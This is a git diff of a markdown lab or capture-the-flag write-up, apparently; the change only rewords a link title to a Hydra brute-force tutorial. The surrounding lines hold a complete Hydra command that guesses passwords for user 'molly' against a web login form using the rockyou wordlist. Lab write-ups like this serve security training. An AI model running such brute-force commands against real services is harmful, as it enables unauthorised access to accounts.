@@ -43,7 +43,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![https://imgur.com/6d5GxKt.png](https://imgur.com/6d5GxKt.png)
 
-[Hydra - Brute Force HTTP(S)](https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/)
+[Hydra - Brute Force HTTPs](https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/)
 
 ```bash
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.19.144 http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect." -v
